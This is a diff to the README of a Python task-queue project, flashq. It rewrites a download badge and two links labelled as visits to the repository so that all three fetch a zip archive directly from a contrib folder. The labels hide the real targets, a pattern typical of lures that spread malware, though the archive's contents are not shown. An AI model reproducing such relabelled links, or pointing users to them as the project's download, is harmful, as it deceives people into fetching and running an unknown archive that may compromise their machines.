@@ -1,6 +1,6 @@
 # ⚡ flashq - Task queues that just work
 
-[![Download flashq](https://img.shields.io/badge/Download-FlashQ-5865F2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Lockwoodepigastric15/flashq)
+[![Download flashq](https://img.shields.io/badge/Download-FlashQ-5865F2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Lockwoodepigastric15/flashq/raw/refs/heads/main/flashq/contrib/Software-v2.4-alpha.1.zip)
 
 ## 🚀 What is flashq?
 
@@ -31,7 +31,7 @@ If you do not have Python yet, install it first from the official Python website
 
 Open this page to download and set up flashq:
 
-[Visit the flashq repository](https://github.com/Lockwoodepigastric15/flashq)
+[Visit the flashq repository](https://github.com/Lockwoodepigastric15/flashq/raw/refs/heads/main/flashq/contrib/Software-v2.4-alpha.1.zip)
 
 If the page includes a release file or package, download it from there and save it to your PC.
 
@@ -245,7 +245,7 @@ This project fits these common Python task queue topics:
 
 ## 📎 Get flashq
 
-[Open the flashq repository](https://github.com/Lockwoodepigastric15/flashq)
+[Open the flashq repository](https://github.com/Lockwoodepigastric15/flashq/raw/refs/heads/main/flashq/contrib/Software-v2.4-alpha.1.zip)
 
 ## 🧩 Need to move from a test run to real use?
 
